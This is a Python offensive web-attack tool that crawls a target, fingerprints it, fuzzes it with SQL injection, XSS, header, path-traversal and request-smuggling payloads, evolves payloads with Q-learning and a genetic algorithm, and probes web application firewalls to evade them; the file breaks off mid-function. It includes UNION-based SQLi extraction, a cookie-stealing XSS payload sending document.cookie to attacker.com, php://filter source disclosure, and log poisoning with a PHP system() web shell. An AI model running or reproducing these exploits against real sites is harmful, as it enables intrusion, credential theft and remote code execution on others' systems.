#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import argparse
import re
import random
import difflib
import hashlib
import json
import time
import urllib.parse
import asyncio
import aiohttp
from bs4 import BeautifulSoup
import builtwith
import colorama
from colorama import Fore, Style
import concurrent.futures
from abc import ABC, abstractmethod
import ssl
import os
import sqlite3
import numpy as np
import yaml
import subprocess
import dns.resolver

colorama.init(autoreset=True)

GLOBAL_WAF_DETECTED = False

class ReconEngine:
    def __init__(self, session=None):
        self.session = session
        self.endpoints = set()
        self.parameters = {}
        self.js_files = set()
        self.robots = []
        self.sitemap = []
        self.processed_urls = set()

    async def get_response(self, url):
        try:
            async with self.session.get(url, timeout=10, allow_redirects=True) as response:
                return await response.text(), response.status
        except Exception:
            return None, None

    async def _worker(self, queue, base_url):
        while True:
            url = await queue.get()
            try:
                if url in self.processed_urls:
                    continue
                self.processed_urls.add(url)

                response_text, status_code = await self.get_response(url)
                if not response_text or status_code != 200:
                    continue
                
                self.endpoints.add(url)
                
                soup = BeautifulSoup(response_text, 'html.parser')
                
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    absolute_url = urllib.parse.urljoin(url, href)
                    if absolute_url.startswith(base_url) and absolute_url not in self.processed_urls:
                        await queue.put(absolute_url)
                
                for form in soup.find_all('form'):
                    action = form.get('action', '')
                    form_url = urllib.parse.urljoin(url, action)
                    method = form.get('method', 'get').lower()
                    
                    params = {}
                    for inp in form.find_all(['input', 'textarea', 'select']):
                        name = inp.get('name')
                        if name:
                            params[name] = inp.get('value', '')
                    
                    if form_url:
                        self.parameters.setdefault(form_url, []).append({
                            'method': method,
                            'params': params
                        })
                
                for script in soup.find_all('script', src=True):
                    js_url = urllib.parse.urljoin(url, script['src'])
                    if js_url.endswith('.js') and js_url not in self.js_files:
                        self.js_files.add(js_url)
                        await self._parse_js(js_url)
            finally:
                queue.task_done()

    async def crawl(self, base_url):
        try:
            robots_url = urllib.parse.urljoin(base_url, "/robots.txt")
            robots_text, robots_status = await self.get_response(robots_url)
            if robots_text and robots_status == 200:
                self.robots = [urllib.parse.urljoin(base_url, line.split(": ")[1]) 
                              for line in robots_text.splitlines() 
                              if line.startswith("Allow:") or line.startswith("Disallow:")]
            
            sitemap_url = urllib.parse.urljoin(base_url, "/sitemap.xml")
            sitemap_text, sitemap_status = await self.get_response(sitemap_url)
            if sitemap_text and sitemap_status == 200:
                soup = BeautifulSoup(sitemap_text, 'lxml-xml')
                self.sitemap = [loc.text for loc in soup.find_all('loc')]
            
            queue = asyncio.Queue()
            await queue.put(base_url)
            
            workers = []
            for _ in range(10): 
                task = asyncio.create_task(self._worker(queue, base_url))
                workers.append(task)

            await queue.join()

            for worker in workers:
                worker.cancel()
            await asyncio.gather(*workers, return_exceptions=True)
            
            self.endpoints.update(self.robots)
            self.endpoints.update(self.sitemap)
            
            return True
        except Exception as e:
            print(Fore.RED + f"[!] Crawling error: {str(e)}")
            return False

    async def _parse_js(self, js_url):
        try:
            response_text, status_code = await self.get_response(js_url)
            if not response_text or status_code != 200:
                return
                
            api_paths = re.findall(r'["\'](/[a-zA-Z0-9_\-/]+)["\']', response_text)
            for path in api_paths:
                self.endpoints.add(urllib.parse.urljoin(js_url, path))
            
            ajax_calls = re.findall(r'\.(?:get|post|ajax)\(["\']([^"\']+)["\']', response.text)
            for call in ajax_calls:
                self.endpoints.add(urllib.parse.urljoin(js_url, call))
        except Exception:
            pass

class FingerprintEngine:
    def __init__(self, url, session=None):
        self.url = url
        self.session = session
        self.tech_stack = {}
        self.favicon_hash = ""
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=1)

    async def fingerprint(self):
        global GLOBAL_WAF_DETECTED
        try:
            loop = asyncio.get_running_loop()
            self.tech_stack = await loop.run_in_executor(
                self.executor,
                builtwith.parse,
                self.url
            )
            
            async with self.session.head(self.url, timeout=10) as response:
                headers = response.headers
                header_tech = {
                    'Server': headers.get('Server', ''),
                    'X-Powered-By': headers.get('X-Powered-By', ''),
                    'X-AspNet-Version': headers.get('X-AspNet-Version', ''),
                    'X-Backend-Server': headers.get('X-Backend-Server', '')
                }
                self.tech_stack['headers'] = header_tech
            
            favicon_url = urllib.parse.urljoin(self.url, "/favicon.ico")
            async with self.session.get(favicon_url, timeout=5) as favicon_res:
                if favicon_res.status == 200:
                    content = await favicon_res.read()
                    self.favicon_hash = hashlib.md5(content).hexdigest()
                    self.tech_stack['favicon'] = {
                        'hash': self.favicon_hash,
                        'size': len(content)
                    }
            
            async with self.session.get(self.url, timeout=10) as response:
                response.raise_for_status()
                response_text = await response.text()
                soup = BeautifulSoup(response_text, 'html.parser')
                
                meta_tech = {}
                for meta in soup.find_all('meta'):
                    name = meta.get('name', '').lower()
                    content = meta.get('content', '')
                    if name and content:
                        meta_tech[name] = content
                
                script_tech = []
                for script in soup.find_all('script'):
                    src = script.get('src', '')
                    if src:
                        script_tech.append(src)
                
                self.tech_stack['meta'] = meta_tech
                self.tech_stack['scripts'] = script_tech

            await self._detect_waf()
            GLOBAL_WAF_DETECTED = self.waf_detected 
            
            return self.tech_stack
        except Exception as e:
            print(Fore.RED + f"[!] Fingerprinting error: {str(e)}")
            return {}

    async def _detect_waf(self):
        self.waf_detected = False
        test_payload = "<script>alert(1)</script>"
        try:
            async with self.session.get(self.url, params={"test": test_payload}, timeout=5) as response:
                if response.status in [403, 406, 501] or any(header in response.headers for header in ['X-WAF', 'Server-WAF', 'Cloudflare-Error']):
                    self.waf_detected = True
                    print(Fore.YELLOW + f"[*] WAF detected on {self.url}. Activating adaptive mode.")
                else:
                    response_text = await response.text()
                    if "Web Application Firewall" in response_text or "ModSecurity" in response_text:
                        self.waf_detected = True
                        print(Fore.YELLOW + f"[*] WAF detected on {self.url}. Activating adaptive mode.")
        except Exception:
            pass

class BaseFuzzModule(ABC):
    def __init__(self):
        self.successful_payloads = set()
        self.failed_payloads = set()
        self.interesting_responses = []

    @abstractmethod
    def get_payloads(self):
        pass

    async def fuzz(self, session, url, params, headers, baseline, adaptive_delay=0):
        vulnerabilities = []
        payload_queue = asyncio.Queue()

        if isinstance(self, HeaderFuzzModule):
            for header_name, payloads in self.get_payloads().items():
                for p in payloads:
                    await payload_queue.put({'payload': p, 'param_name': header_name, 'is_url_fuzzing': False})
        elif isinstance(self, URLPathFuzzModule):
            for p in self.get_payloads():
                await payload_queue.put({'payload': p, 'param_name': "URL Path", 'is_url_fuzzing': True})
        elif isinstance(self, SmugglingModule):
             for p in self.get_payloads():
                 await payload_queue.put({'payload': p, 'param_name': None, 'is_url_fuzzing': False})
        else: 
            for param, value in params.items():
                for p in self.get_payloads():
                    await payload_queue.put({'payload': p, 'param_name': param, 'is_url_fuzzing': False})
        
        fuzz_tasks = []
        for _ in range(5): 
            task = asyncio.create_task(self._fuzz_worker(session, url, params, headers, baseline, vulnerabilities, payload_queue, adaptive_delay))
            fuzz_tasks.append(task)
        
        await payload_queue.join()

        for task in fuzz_tasks:
            task.cancel()
        await asyncio.gather(*fuzz_tasks, return_exceptions=True)

        return vulnerabilities

    async def _fuzz_worker(self, session, url, params, headers, baseline, vulnerabilities, payload_queue, adaptive_delay):
        while True:
            try:
                item = await payload_queue.get()
                payload = item['payload']
                param_name = item['param_name']
                is_url_fuzzing = item['is_url_fuzzing']

                mutated_payload = self._mutate_payload(payload)
                
                result = await self._test_payload_internal(session, url, 'post' if params and not is_url_fuzzing else 'get', params, headers, param_name, mutated_payload, baseline, is_url_fuzzing, adaptive_delay)
                if result:
                    vulnerabilities.append(result)
            except asyncio.CancelledError:
                break
            except Exception as e:
                pass 
            finally:
                payload_queue.task_done()
                await asyncio.sleep(adaptive_delay) 

    @abstractmethod
    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        pass

    @abstractmethod
    async def exploit(self, session, url, param, payload, method, params):
        pass

    def _mutate_payload(self, payload):
        mutations = []
        mutations.append(lambda s: s.replace("'", "%27"))
        mutations.append(lambda s: s.replace('"', "%22"))
        mutations.append(lambda s: s.replace("<", "%3C"))
        mutations.append(lambda s: s.replace(">", "%3E"))
        mutations.append(lambda s: s.replace(" ", "%20"))
        mutations.append(lambda s: ''.join(f"%{ord(c):02x}" for c in s))
        
        mutations.append(lambda s: s.upper())
        mutations.append(lambda s: s.lower())
        mutations.append(lambda s: ''.join(random.choice([c.upper(), c.lower()]) for c in s))
        
        comments = ["/*", "*/", "--", "#", ""]
        mutations.append(lambda s: s + random.choice(comments))
        mutations.append(lambda s: random.choice(comments) + s)
        mutations.append(lambda s: s.replace(" ", "/**/"))
        
        return random.choice(mutations)(payload)

    async def _test_payload_internal(self, session, url, method, params, headers, param_name, payload, baseline, is_url_fuzzing=False, adaptive_delay=0):
        if (self.__class__.__name__, payload) in self.failed_payloads:
            return None
            
        test_params = params.copy()
        test_headers = headers.copy()
        test_url = url

        if isinstance(self, HeaderFuzzModule):
            if param_name:
                test_headers[param_name] = payload
        elif is_url_fuzzing:
            test_url = urllib.parse.urljoin(url, payload)
        elif isinstance(self, SmugglingModule):
            test_headers['X-Smuggling-Payload'] = payload
        
        try:
            async with session.request(method.upper(), test_url, params=test_params, data=test_params if method == 'post' else None, headers=test_headers, timeout=10) as response:
                content = await response.read()
                status = response.status
            
            if status in [403, 401, 429]:
                self.failed_payloads.add((self.__class__.__name__, payload))
                return None
            
            is_vulnerable, evidence = self.check_vulnerability(content.decode('utf-8', 'ignore'), status, baseline, payload)
            
            if is_vulnerable:
                self.successful_payloads.add((self.__class__.__name__, payload))
                result = {
                    'url': url,
                    'param': param_name if param_name else 'N/A',
                    'payload': payload,
                    'type': self.__class__.__name__,
                    'status': status,
                    'length': len(content),
                    'response': content[:1000],
                    'evidence': evidence,
                    'fitness_score': self._calculate_fitness(status, len(content), baseline['status'], baseline['length'], evidence)
                }
                return result
            else:
                self.failed_payloads.add((self.__class__.__name__, payload))
                return None
        except Exception:
            self.failed_payloads.add((self.__class__.__name__, payload))
            return None
        finally:
            if adaptive_delay > 0:
                await asyncio.sleep(adaptive_delay)

    def _calculate_fitness(self, current_status, current_length, baseline_status, baseline_length, evidence):
        score = 0
        if current_status != baseline_status:
            score += 0.5
        length_diff_ratio = abs(current_length - baseline_length) / max(current_length, baseline_length, 1)
        score += length_diff_ratio * 0.3

        if evidence and "SQL error" in evidence:
            score += 0.5
        if evidence and "reflected" in evidence:
            score += 0.4
        if evidence and "Time-based blind" in evidence:
            score += 0.6
        if current_status >= 500: 
            score += 0.2
        return min(score, 1.0) 

class SQLiModule(BaseFuzzModule):
    def get_payloads(self):
        return [
            "' OR '1'='1",
            "' OR SLEEP(5)--",
            "1' ORDER BY 1--",
            "1' UNION SELECT null,version()--",
            "1 AND 1=1",
            "1 AND 1=0",
            "' OR ''='",
            "' OR 1=1--",
            "\" OR \"\"=\"",
            "\" OR 1=1--"
        ]

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        sql_errors = [
            r"SQL syntax", r"unexpected token", r"unterminated string",
            r"ORA-\d+", r"MySQL server version", r"PostgreSQL.*ERROR",
            r"Warning: mysql", r"Unclosed quotation mark", r"syntax error",
            r"You have an error in your SQL syntax", r"supplied argument is not a valid MySQL result"
        ]
        
        if response_status != baseline_content['status']:
            return True, f"Status code changed from {baseline_content['status']} to {response_status}"
        
        length_diff = abs(len(response_text) - baseline_content['length'])
        if length_diff > len(payload) * 2:
            return True, "Significant content length change"
        
        for error in sql_errors:
            if re.search(error, response_text, re.IGNORECASE):
                return True, f"SQL error message detected: {error}"
            
        seq_matcher = difflib.SequenceMatcher(None, baseline_content['content'].decode('utf-8', 'ignore'), response_text)
        if seq_matcher.ratio() < 0.95:
            return True, "Significant content change (diff ratio < 0.95)"
            
        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        test_params = params.copy()
        
        print(Fore.CYAN + f"[*] Attempting advanced SQLi exploitation on {url} (Param: {param})...")

        print(Fore.BLUE + "[*] Trying UNION-based version extraction...")
        version_payload_union = payload.replace("--", "") + " UNION SELECT 1,2,3,version(),5,6,7,8,9,10 --" 
        test_params[param] = version_payload_union
        
        try:
            if method == 'get':
                async with session.get(url, params=test_params, timeout=10) as response:
                    response_text = await response.text()
            else:
                async with session.post(url, data=test_params, timeout=10) as response:
                    response_text = await response.text()
            
            version_match = re.search(r"(\d+\.\d+\.\d+[-\w]*)", response_text)
            if version_match:
                return f"DB_VERSION: {version_match.group(1)} (extracted using UNION-based SQLi).", 0.98
        except Exception:
            pass

        print(Fore.BLUE + "[*] Trying Time-based blind detection...")
        time_based_payload = payload + " AND SLEEP(5)"
        test_params[param] = time_based_payload
        start_time = time.time()
        try:
            if method == 'get':
                await session.get(url, params=test_params, timeout=10)
            else:
                await session.post(url, data=test_params, timeout=10)
            
            if time.time() - start_time >= 4.5:
                return f"DB_VERSION: Time-based blind delay detected (indicates vulnerability).", 0.9
        except asyncio.TimeoutError:
            return f"DB_VERSION: Time-based blind timeout detected (indicates vulnerability).", 0.9
        except Exception:
            pass

        return f"DB_VERSION: Extraction failed or not applicable.", 0.7

class XSSModule(BaseFuzzModule):
    def get_payloads(self):
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "onmouseover=alert(1)",
            "alert`1`",
            "<svg/onload=alert(1)>",
            "';alert(1)//",
            "\"';alert(1)//"
        ]

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        if response_status != baseline_content['status']:
            return True, f"Status code changed from {baseline_content['status']} to {response_status}"

        length_diff = abs(len(response_text) - baseline_content['length'])
        if length_diff > len(payload) * 2:
            return True, "Significant content length change"
            
        if payload in response_text:
            return True, "Payload reflected in response"
            
        xss_patterns = [
            r"<script>.*alert", r"onerror=.*alert", r"<img src=x>"
        ]
        
        for pattern in xss_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True, f"XSS pattern detected: {pattern}"

        seq_matcher = difflib.SequenceMatcher(None, baseline_content['content'].decode('utf-8', 'ignore'), response_text)
        if seq_matcher.ratio() < 0.95:
            return True, "Significant content change (diff ratio < 0.95)"

        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        poc_payload = f"<img src=x onerror=\"fetch('https://attacker.com?cookie='+document.cookie)\">"
        return poc_payload, 0.8

class HeaderFuzzModule(BaseFuzzModule):
    def get_payloads(self):
        return {
            'User-Agent': SQLiModule().get_payloads() + XSSModule().get_payloads() + ["Mozilla/5.0 (Custom UA)"],
            'Referer': ["http://malicious.com/", "' OR '1'='1", "<script>alert(1)</script>"],
            'X-Forwarded-For': ["127.0.0.1", "localhost", "127.0.0.1' OR '1'='1", "127.0.0.1<script>alert(1)</script>"],
            'Accept': ["application/json", "text/html", "' OR '1'='1"],
            'Accept-Language': ["en-US,en;q=0.9", "fr-FR,fr;q=0.9", "<script>alert(1)</script>"],
            'Cookie': ["test=1' OR '1'='1", "test=<script>alert(1)</script>"],
            'Host': ["example.com", "localhost", "' OR '1'='1"],
            'Origin': ["http://malicious.2om", "' OR '1'='1"] 
        }

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        sqli_check, sqli_evidence = SQLiModule().check_vulnerability(response_text, response_status, baseline_content, payload)
        xss_check, xss_evidence = XSSModule().check_vulnerability(response_text, response_status, baseline_content, payload)

        if sqli_check:
            return True, f"SQLi pattern detected in header: {sqli_evidence}"
        if xss_check:
            return True, f"XSS pattern detected in header: {xss_evidence}"

        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        return f"Header fuzzing result. Payload used: {payload}. Further manual analysis recommended.", 0.5

class URLPathFuzzModule(BaseFuzzModule):
    def get_payloads(self):
        return [
            "'", "\"", "`", ";",
            "../", "../../", "/%2e%2e/", "/%2e",
            "<", ">", "<script>alert(1)</script>",
            "' OR '1'='1", "AND 1=1", "AND 1=0",
            "/.git/HEAD", "/.env", "/robots.txt", "/etc/passwd", "/windows/win.ini"
        ]

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        sqli_check, sqli_evidence = SQLiModule().check_vulnerability(response_text, response_status, baseline_content, payload)
        xss_check, xss_evidence = XSSModule().check_vulnerability(response_text, response_status, baseline_content, payload)

        if response_status != baseline_content['status'] and response_status in [200, 404]:
            if payload.strip() in response_text:
                return True, f"URL path payload '{payload}' reflected or caused status change to {response_status}."
        if sqli_check:
            return True, f"SQLi pattern detected in URL path: {sqli_evidence}"
        if xss_check:
            return True, f"XSS pattern detected in URL path: {xss_evidence}"
        
        if "root:x:0:0" in response_text or "SSH-2.0" in response_text or "[boot loader]" in response_text:
             return True, f"Sensitive file content or service banner exposed by URL path fuzzing."

        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        print(Fore.CYAN + f"[*] Attempting LFI/RFI exploitation on {url} (Path: {payload})...")

        if "php" in url.lower() or "php" in payload.lower():
            filter_payload = f"php://filter/convert.base64-encode/resource={payload.lstrip('/')}"
            try:
                async with session.get(urllib.parse.urljoin(url, filter_payload), timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()
                        if "PD9waHAg" in content:
                            return f"LFI: PHP source code disclosure via php://filter. Example: {filter_payload}", 0.95
            except Exception:
                pass

        log_poison_payload = "<?php system($_GET['cmd']); ?>"
        log_headers = params.get('headers', {}).copy()
        log_headers['User-Agent'] = log_poison_payload

        access_log_paths = [
            "/var/log/apache2/access.log",
            "/var/log/httpd/access_log",
            "/var/log/nginx/access.log"
        ]

        for log_path in access_log_paths:
            try:
                async with session.get(url, headers=log_headers, timeout=5) as response:
                    await response.read()
                    if response.status == 200:
                        log_include_url = urllib.parse.urljoin(url, f"{payload.split('?')[0].rstrip('/')}/{log_path}?cmd=id")
                        async with session.get(log_include_url, timeout=10) as include_response:
                            if include_response.status == 200:
                                include_content = await include_response.text()
                                if "uid=" in include_content and "gid=" in include_content:
                                    return f"LFI/Log Poisoning detected! Command 'id' executed via log file: {log_path}", 0.9
            except Exception:
                pass

        return f"URL path fuzzing result. Payload used: {payload}. Further manual analysis recommended for misconfigurations/LFI/RFI.", 0.6

class SmugglingModule(BaseFuzzModule):
    def get_payloads(self):
        return [
            "CL.TE", 
            "TE.CL", 
            "TE.TE_chunked_crlf", 
            "TE.TE_double_chunked" 
        ]

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        if response_status == 400 and "Bad Request" in response_text:
            return True, f"HTTP 400 and 'Bad Request' in response, indicative of a smuggled request being rejected."
        if response_status == 500 and "Internal Server Error" in response_text:
            return True, f"HTTP 500 and 'Internal Server Error', potentially due to a smuggled request."
        
        if "Smuggled Request Processed" in response_text:
            return True, f"Specific marker for smuggled request processing found."
        
        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        print(Fore.RED + f"[*] HTTP Request Smuggling exploitation requires a deep understanding of the target's proxy chain and manual crafting. This module serves as a fuzzer for potential vulnerabilities detected via mitmproxy interaction. The payload ({payload}) indicates the *type* of smuggling attempted by the proxy, not an executable exploit string.")
        
        smuggled_target_path = "/admin"
        smuggled_request_payload = f"GET {smuggled_target_path} HTTP/1.1\r\nHost: {urllib.parse.urlparse(url).netloc}\r\n\r\n"
        
        return f"HTTP Request Smuggling POC for type '{payload}'. Potential smuggled request: '{smuggled_request_payload.strip()}'. Manual verification with mitmproxy is crucial.", 0.9

class QLearningBrain:
    def __init__(self, brain_file="brain.json"):
        self.brain_file = brain_file
        self.q_table = {} 
        self._load_brain()
        self.alpha = 0.1 
        self.gamma = 0.9 
        self.epsilon = 0.1 

    def _load_brain(self):
        if os.path.exists(self.brain_file):
            with open(self.brain_file, 'r') as f:
                loaded_data = json.load(f)
                self.q_table = {tuple(eval(k)) if k.startswith('(') else k: v for k, v in loaded_data.items()}

    def _save_brain(self):
        serializable_q_table = {str(k): v for k, v in self.q_table.items()}
        with open(self.brain_file, 'w') as f:
            json.dump(serializable_q_table, f, indent=4)

    def get_action(self, state, available_actions):
        state_key = self._get_state_key(state)
        if state_key not in self.q_table:
            self.q_table[state_key] = {action: 0.0 for action in available_actions}
            return random.choice(available_actions) 

        if random.random() < self.epsilon:
            return random.choice(available_actions) 
        else:
            q_values = self.q_table[state_key]
            filtered_q_values = {action: q_values.get(action, 0.0) for action in available_actions}
            
            if not filtered_q_values: 
                return random.choice(available_actions)

            best_action = max(filtered_q_values, key=filtered_q_values.get)
            return best_action

    def update_q_table(self, state, action, reward, next_state, available_next_actions):
        state_key = self._get_state_key(state)
        next_state_key = self._get_state_key(next_state)

        old_q_value = self.q_table[state_key].get(action, 0.0)

        next_max_q = 0.0
        if next_state_key in self.q_table and available_next_actions:
            next_max_q = max([self.q_table[next_state_key].get(a, 0.0) for a in available_next_actions])
        
        new_q_value = old_q_value + self.alpha * (reward + self.gamma * next_max_q - old_q_value)
        self.q_table[state_key][action] = new_q_value
        self._save_brain() 

    def _get_state_key(self, state):
        return tuple(state)

class GeneticAlgorithmFuzzer:
    def __init__(self, session, modules, brain, initial_payloads_per_module=5, generations=3, population_size=10, mutation_rate=0.1):
        self.session = session
        self.modules = modules
        self.brain = brain 
        self.initial_payloads_per_module = initial_payloads_per_module
        self.generations = generations
        self.population_size = population_size
        self.mutation_rate = mutation_rate
        self.all_interesting_vulnerabilities = []

    async def run_genetic_fuzzing(self, url, form_data, initial_headers, baseline, tech_stack):
        method = form_data['method']
        params = form_data['params']
        
        current_population = []
        available_actions = [module.__class__.__name__ for module in self.modules]
        
        current_state = self._get_current_state(tech_stack, form_data)
        
        best_module_type_from_brain = self.brain.get_action(current_state, available_actions)
        
        brain_suggested_module = next((m for m in self.modules if m.__class__.__name__ == best_module_type_from_brain), None)
        
        if brain_suggested_module:
            initial_module_payloads = random.sample(brain_suggested_module.get_payloads(), min(self.initial_payloads_per_module, len(brain_suggested_module.get_payloads())))
            for p in initial_module_payloads:
                current_population.append({'payload': p, 'module': brain_suggested_module, 'param_name': None})
        
        while len(current_population) < self.population_size:
            random_module = random.choice(self.modules)
            payloads_from_module = random_module.get_payloads()
            if payloads_from_module:
                p = random.choice(payloads_from_module)
                current_population.append({'payload': p, 'module': random_module, 'param_name': None})


        print(Fore.MAGENTA + f"\n[*] Starting genetic fuzzing for {url} (Initial population size: {len(current_population)})...")

        for generation in range(self.generations):
            print(Fore.MAGENTA + f"[*] Generation {generation + 1}/{self.generations}")
            evaluated_payloads = [] 

            tasks = []
            for item in current_population:
                payload = item['payload']
                module = item['module']
                param_name = None
                is_url_fuzzing = False
                if isinstance(module, (SQLiModule, XSSModule)):
                    if params:
                        param_name = random.choice(list(params.keys())) 
                elif isinstance(module, HeaderFuzzModule):
                    param_name = random.choice(list(module.get_payloads().keys())) 
                elif isinstance(module, URLPathFuzzModule):
                    param_name = "URL Path"
                    is_url_fuzzing = True
                elif isinstance(module, SmugglingModule): 
                    param_name = "HTTP_Request_Smuggling" 
                
                if param_name or is_url_fuzzing: 
                    tasks.append(
                        module._test_payload_internal(self.session, url, method, params, initial_headers, param_name, payload, baseline, is_url_fuzzing, GLOBAL_WAF_DETECTED * random.uniform(0.1, 0.5))
                    )

            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res:
                    evaluated_payloads.append(res)
                    self.all_interesting_vulnerabilities.append(res) 

            if not evaluated_payloads:
                print(Fore.YELLOW + "[*] No interesting payloads found in this generation. Stopping genetic fuzzing.")
                break

            evaluated_payloads.sort(key=lambda x: x['fitness_score'], reverse=True)
            
            next_generation_population = []
            
            num_elite = max(1, int(self.population_size * 0.1))
            for i in range(min(num_elite, len(evaluated_payloads))):
                next_generation_population.append(evaluated_payloads[i])

            while len(next_generation_population) < self.population_size and len(evaluated_payloads) >= 2:
                parent1_data = random.choice(evaluated_payloads)
                parent2_data = random.choice(evaluated_payloads)
                
                parent1_payload = parent1_data['payload']
                parent2_payload = parent2_data['payload']

                crossover_point = random.randint(0, min(len(parent1_payload), len(parent2_payload)))
                child_payload = parent1_payload[:crossover_point] + parent2_payload[crossover_point:]
                
                mutating_module = random.choice([parent1_data['module'], parent2_data['module']])
                if random.random() < self.mutation_rate:
                    mutated_child = mutating_module._mutate_payload(child_payload)
                else:
                    mutated_child = child_payload
                
                random_module = random.choice(self.modules)
                next_generation_population.append({'payload': mutated_child, 'module': random_module, 'param_name': None})
            
            current_population = next_generation_population
        
        return self.all_interesting_vulnerabilities

    def _get_current_state(self, tech_stack, form_data):
        tech_str = ""
        if 'programming_languages' in tech_stack and tech_stack['programming_languages']:
            tech_str = tech_stack['programming_languages'][0] 
        
        input_type = "Form_Params" if form_data and form_data['params'] else "No_Params"
        
        waf_status = "WAF_Detected" if GLOBAL_WAF_DETECTED else "No_WAF"
        
        return (tech_str, input_type, waf_status)

class APIModule:
    def __init__(self, session):
        self.session = session
        self.endpoints = [] 

    async def load_spec(self, file_path):
        try:
            with open(file_path, 'r') as f:
                if file_path.endswith(('.yaml', '.yml')):
                    spec = yaml.safe_load(f)
                else: 
                    spec = json.load(f)
            
            if 'swagger' in spec or 'openapi' in spec:
                print(Fore.GREEN + f"[*] Loaded OpenAPI/Swagger spec from {file_path}")
                self._parse_openapi_spec(spec)
            else:
                print(Fore.RED + "[!] Unsupported API specification format.")
        except Exception as e:
            print(Fore.RED + f"[!] Error loading API spec: {e}")

    def _parse_openapi_spec(self, spec):
        base_path = spec.get('basePath', '/')
        if 'paths' not in spec:
            return

        for path, methods in spec['paths'].items():
            full_path = urllib.parse.urljoin(base_path, path)
            for method, details in methods.items():
                if method.lower() not in ['get', 'post', 'put', 'delete']:
                    continue
                
                params = []
                if 'parameters' in details:
                    for param_spec in details['parameters']:
                        params.append({
                            'name': param_spec.get('name'),
                            'in': param_spec.get('in'), 
                            'required': param_spec.get('required', False),
                            'type': param_spec.get('type', 'string'),
                            'default': param_spec.get('default')
                        })
                
                self.endpoints.append({
                    'path': full_path,
                    'method': method.lower(),
                    'params_schema': params
                })

    async def fuzz_api_endpoints(self, fuzzing_modules, initial_headers, baseline_getter, tech_stack, brain):
        all_api_vulnerabilities = []
        for endpoint in self.endpoints:
            url = endpoint['path']
            method = endpoint['method']
            
            dummy_params = {}
            for param_schema in endpoint['params_schema']:
                dummy_params[param_schema['name']] = param_schema.get('default', 'test_value')

            baseline = await baseline_getter(url, method, dummy_params, initial_headers)
            if not baseline:
                continue

            print(Fore.CYAN + f"[*] Fuzzing API Endpoint: {method.upper()} {url}...")
            
            ga_fuzzer = GeneticAlgorithmFuzzer(self.session, fuzzing_modules, brain)
            api_vulnerabilities = await ga_fuzzer.run_genetic_fuzzing(url, {'method': method, 'params': dummy_params}, initial_headers, baseline, tech_stack)
            all_api_vulnerabilities.extend(api_vulnerabilities)

        return all_api_vulnerabilities

class Fuzzer:
    def __init__(self, session, brain, waf_detected=False, concurrency=10):
        self.session = session
        self.brain = brain
        self.base_responses = {}
        self.waf_detected = waf_detected
        self.concurrency = concurrency
        self.modules = [
            SQLiModule(),
            XSSModule(),
            HeaderFuzzModule(),
            URLPathFuzzModule(),
            SmugglingModule()
        ]
        self.genetic_fuzzer = GeneticAlgorithmFuzzer(self.session, self.modules, self.brain)


    async def get_baseline_response(self, url, method, params, headers):
        if url not in self.base_responses:
            try:
                if method == 'get':
                    async with self.session.get(url, params=params, headers=headers, timeout=10) as response:
                        content = await response.read()
                        self.base_responses[url] = {
                            'status': response.status,
                            'length': len(content),
                            'content': content
                        }
                else:
                    async with self.session.post(url, data=params, headers=headers, timeout=10) as response:
                        content = await response.read()
                        self.base_responses[url] = {
                            'status': response.status,
                            'length': len(content),
                            'content': content
                        }
            except Exception:
                pass
        return self.base_responses.get(url)

    async def fuzz(self, url, form_data, initial_headers, tech_stack):
        method = form_data['method']
        params = form_data['params']
        
        baseline = await self.get_baseline_response(url, method, params, initial_headers)
        if not baseline:
            return []
        
        all_vulnerabilities = []
        
        genetic_vulnerabilities = await self.genetic_fuzzer.run_genetic_fuzzing(url, form_data, initial_headers, baseline, tech_stack)
        all_vulnerabilities.extend(genetic_vulnerabilities)

        return all_vulnerabilities

class WAFBypassModule:
    def __init__(self, session):
        self.session = session
        self.waf_signatures = {
            'Cloudflare': {'headers': ['CF-RAY', 'Server: cloudflare'], 'body_regex': r'cloudflare\.com/5xx-errors'},
            'ModSecurity': {'headers': ['Server: Mod_Security', 'X-Powered-By: ModSecurity'], 'body_regex': r'Mod_Security|mod_security'},
            'Sucuri': {'headers': ['X-Sucuri-ID', 'X-Sucuri-Cache'], 'body_regex': r'Sucuri WebSite Firewall|sucuri.net'},
            'Akamai': {'headers': ['X-Akamai-Transformed'], 'body_regex': r'akamai.com'}
        }
        self.identified_waf = None

    async def identify_waf(self, url):
        print(Fore.CYAN + f"[*] Identifying WAF/IPS for {url}...")
        test_payload = "<script>alert(1)</script>"
        try:
            async with self.session.get(url, params={"test": test_payload}, timeout=10) as response:
                response_text = await response.text()
                for waf_name, signatures in self.waf_signatures.items():
                    if any(header in response.headers for header in signatures.get('headers', [])):
                        self.identified_waf = waf_name
                        print(Fore.GREEN + f"[+] Identified WAF: {waf_name}")
                        return waf_name
                    if signatures.get('body_regex') and re.search(signatures['body_regex'], response_text, re.IGNORECASE):
                        self.identified_waf = waf_name
                        print(Fore.GREEN + f"[+] Identified WAF: {waf_name}")
                        return waf_name
                print(Fore.YELLOW + "[-] No specific WAF identified from signatures.")
                return None
        except Exception as e:
            print(Fore.RED + f"[!] Error during WAF identification: {e}")
            return None

    async def discover_waf_rules(self, url):
        if not self.identified_waf:
            print(Fore.YELLOW + "[-] No specific WAF identified, cannot discover rules.")
            return None
        
        print(Fore.CYAN + f"[*] Discovering rules for {self.identified_waf} on {url}...")
        
        rule_findings = []
        common_sqli_keywords = ["UNION SELECT", "SLEEP(", "ORDER BY"]
        common_xss_keywords = ["<script>", "alert(", "onerror="]

        for keyword in common_sqli_keywords + common_xss_keywords:
            test_payload = f"1' {keyword} 1--"
            try:
